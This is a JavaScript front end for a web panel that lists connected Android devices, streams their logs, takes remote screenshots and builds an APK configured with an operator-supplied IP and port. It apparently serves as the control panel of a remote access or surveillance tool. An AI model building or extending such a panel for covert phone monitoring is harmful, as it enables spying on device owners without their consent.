const devices = document.getElementById("devices")
const infos = document.getElementById("infos")
const form = document.getElementById("left")
const msgs = document.getElementById("msgs")
const output = document.getElementById("output")
const ipInput = document.getElementById('ipInput')
const portInput = document.getElementById('portInput')

let currentDevice = ""
let previousDevice = ""
let currentDeviceConnected = false

document.querySelectorAll("form").forEach(e => {
    e.addEventListener("submit", i => i.preventDefault())
})

/* Clearing */
// form.reset()
infos.innerHTML = '<div class="info">    <span>Brand :</span>    <span>--</span></div><div class="info">    <span>Model :</span>    <span>--</span></div><div class="info">    <span>Manufacture :</span>    <span>--</span></div><div class="device-action"><div class="screenshot-button" onclick="takeScreenshot()" title="Take Screenshot"><img src="../img/screenshot.png" alt="Take Screenshot"><span>Take Screenshot</span></div></div>'

async function getInfo(id) {
    previousDevice = currentDevice;
    if (id != "None") {
        socket.emit("get_device_info", id);
    } else {
        currentDevice = ""
        previousDevice = "";
        currentDeviceConnected = false;
        infos.innerHTML = '<div class="info">    <span>Brand :</span>    <span>--</span></div><div class="info">    <span>Model :</span>    <span>--</span></div><div class="info">    <span>Manufacture :</span>    <span>--</span></div><div class="device-action"><div class="screenshot-button" onclick="takeScreenshot()" title="Take Screenshot"><img src="../img/screenshot.png" alt="Take Screenshot"><span>Take Screenshot</span></div></div>'
        updateScreenshotButton()
        output.value = "";
        updateScreenshotButton();
    }
}

/** Making Socket Connections */
const socket = io(`ws://${document.location.hostname}:4001/`, { transports: ['websocket'], upgrade: false })

socket.on("logger", ({device, log}) => {
    if (device === currentDevice) {
        // console.log(log)
        output.value += log.trim() + "\n";
        output.scrollTop = output.scrollHeight;
    }
})

socket.on("device_logs", (logs) => {
    output.value = logs.join('\n');
    if (output.value) {
        output.scrollTop = output.scrollHeight;
    }
})

socket.on("info", (data) => {
    // console.log(data)
    devices.innerHTML = '<option data-display="Devices">None</option>'
    data.forEach(i => {
        const status = i.connected === false ? " [offline]" : "";
        devices.insertAdjacentHTML("beforeend", `<option value="${i.ID}">${i.Brand} (${i.Model})${status}</option>`)
    })
    $("select").niceSelect("update")
    // Update screenshot button state after devices are loaded
    updateScreenshotButton()
})

socket.on("screenshot_ready", (data) => {
    if (data.device_uuid === currentDevice) {
        const filename = data.filename || 'screenshot.jpg';
        const imageUrl = window.location.origin + '/screenshots/' + filename;
        const a = document.createElement('a');
        a.href = imageUrl;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        showMsg(`Screenshot downloaded: ${filename}`);

        // Optional: Preview in modal (uncomment if desired)
        // const modal = document.createElement('div');
        // modal.innerHTML = `<img src="${imageUrl}" style="max-width:100%; height:auto;" /><button onclick="this.parentElement.remove()">Close</button>`;
        // modal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:white;';
        // document.body.appendChild(modal);
    }
});

socket.on("screenshot_error", (data) => {
    if (data.device_uuid === currentDevice) {
        showMsg(`Screenshot error: ${data.error}`);
    }
});

socket.on("device_info", (data) => {
    currentDevice = data.device_uuid || currentDevice;
    currentDeviceConnected = data.connected !== false;
    let tmp = "";
    delete data['ID'];
    for (let i in data) {
        tmp += `<div class="info">
        <span>${i} :</span>
        <span>${data[i]}</span>
    </div>`;
    }
    // Preserve the screenshot button when updating device info
    infos.innerHTML = tmp + '<div class="device-action"><div class="screenshot-button" onclick="takeScreenshot()" title="Take Screenshot"><img src="../img/screenshot.png" alt="Take Screenshot"><span>Take Screenshot</span></div></div>';
    updateScreenshotButton();
    // Fetch existing logs
    socket.emit("get_device_logs", currentDevice);
});

socket.on("device_info_error", (data) => {
    showMsg(`Error getting device info: ${data.error}`);
});

socket.on("build_success", (data) => {
    hideBuildProgress();
    showMsg('Build success');
});

socket.on("build_error", (data) => {
    hideBuildProgress();
    showMsg(data.error || 'Build failed');
});



/** Functions */

function updateScreenshotButton() {
    const screenshotButton = document.querySelector('.screenshot-button');
    console.log('updateScreenshotButton called:', {
        currentDevice,
        currentDeviceConnected,
        screenshotButton: !!screenshotButton
    });

    if (!screenshotButton) {
        console.log('Screenshot button not found!');
        return;
    }

    // Check if no device is selected or device is offline
    const isDisabled = !currentDevice || !currentDeviceConnected;

    if (isDisabled) {
        screenshotButton.classList.add('disabled');
        screenshotButton.title = !currentDevice ? "Please select a device first" : "Device is offline";
        console.log('Button disabled, class added');
    } else {
        screenshotButton.classList.remove('disabled');
        screenshotButton.title = "Take Screenshot";
        console.log('Button enabled, class removed');
    }

}

function takeScreenshot() {
    if (!currentDevice) {
        showMsg("Please select a device first.");
        return;
    }

    if (!currentDeviceConnected) {
        showMsg("Cannot take screenshot: Device is offline.");
        return;
    }

    socket.emit("screenshot_req", currentDevice);
    showMsg("Screenshot request sent. Waiting for response...");
}


function download() {
    var ip = ipInput.value.trim()
    var port = portInput.value.trim()

    try {
        if (ip.length && port.length) {
            showBuildProgress()
            socket.emit("build_request", { ip, port });
        } else {
            showMsg('Please enter both IP/Domain and Port')
        }
    } catch (error) {
        hideBuildProgress()
        showMsg('Build request failed')
    }
}

function downloadLatest() {
  var a = document.createElement('a');
  a.href = window.location.protocol + '//' + window.location.hostname + ':8080/download-apk';
  a.download = 'latest-app-debug.apk';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}

function showBuildProgress() {
    const buildButton = document.querySelector('.section-apk-inline');
    const buildButtonText = document.getElementById('buildButtonText');
    const buildProgress = document.getElementById('buildProgress');

    // Disable the build button
    buildButton.style.pointerEvents = 'none';
    buildButton.style.opacity = '0.6';

    // Change button text
    buildButtonText.textContent = 'Building...';

    // Show progress indicator
    buildProgress.style.display = 'block';

    // Add loading animation to progress bar
    const progressFill = buildProgress.querySelector('.progress-fill');
    progressFill.style.width = '0%';
    progressFill.style.transition = 'width 0.3s ease-in-out';

    // Animate progress bar
    setTimeout(() => {
        progressFill.style.width = '100%';
    }, 100);
}

function hideBuildProgress() {
    const buildButton = document.querySelector('.section-apk-inline');
    const buildButtonText = document.getElementById('buildButtonText');
    const buildProgress = document.getElementById('buildProgress');

    // Re-enable the build button
    buildButton.style.pointerEvents = 'auto';
    buildButton.style.opacity = '1';

    // Restore button text
    buildButtonText.textContent = 'Build APK';

    // Hide progress indicator
    buildProgress.style.display = 'none';
}

function showMsg(msg) {
    var pTag = document.createElement("p")
    pTag.className = "msg"
    pTag.innerText = msg
    msgs.insertAdjacentElement("beforeend", pTag)
    setTimeout(() => pTag.remove(), 5000)
}

$(document).ready(() => {
    $("select").niceSelect()
    // Initialize screenshot button state
    updateScreenshotButton()
})
